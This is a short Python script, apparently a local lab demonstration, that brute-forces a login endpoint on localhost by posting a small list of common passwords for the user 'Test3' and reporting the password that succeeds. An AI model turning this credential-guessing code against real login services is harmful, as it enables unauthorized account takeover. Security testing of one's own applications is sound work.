import requests
import time

API_URL = "http://127.0.0.1:8000/login"

# Target username
username = "Test3"

# Common password list (simulate attacker dictionary)
password_list = [
    "123456",
    "password",
    "admin123",
    "Test@123",
    "wrongpass",
    "Secure@123"
]

def brute_force():
    print("Starting brute force attack...\n")

    for password in password_list:
        print(f"Trying password: {password}")

        response = requests.post(
            API_URL,
            params={"username": username, "password": password}
        )

        if response.status_code == 200:
            print("\n✅ SUCCESS! Password found:", password)
            print("Response:", response.json())
            return

        else:
            print("❌ Failed:", response.json())

        time.sleep(1)  # simulate realistic delay

    print("\n❌ Attack finished. Password not found.")

if __name__ == "__main__":
    brute_force()